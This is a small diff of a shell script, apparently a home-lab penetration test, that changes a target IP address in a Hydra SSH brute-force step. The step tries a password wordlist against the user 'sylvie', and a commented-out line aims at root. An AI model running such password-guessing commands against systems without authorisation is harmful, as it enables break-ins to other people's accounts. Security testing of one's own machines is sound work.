@@ -2,7 +2,7 @@
 
 
 if [ -z "$1" ]; then
-    echo "Usage: $0 <192.168.1.152>"
+    echo "Usage: $0 <192.168.1.125>"
     exit 1
 fi
 
@@ -38,7 +38,7 @@ echo "Testing SSH login with Hydra on $TARGET..."
 
 if [[ "$open_ports" =~ "22" ]]; then
     #hydra -t 2 -l root -P ~/smallwordlist.txt ssh://$TARGET
-    sudo hydra -l sylvie -P ~/smallwordlist.txt 192.168.1.152 -t 1 ssh
+    sudo hydra -l sylvie -P ~/smallwordlist.txt 192.168.1.125 -t 1 ssh
 
 else
     echo "Aucun service SSH trouvé, skipping Hydra SSH brute force test."
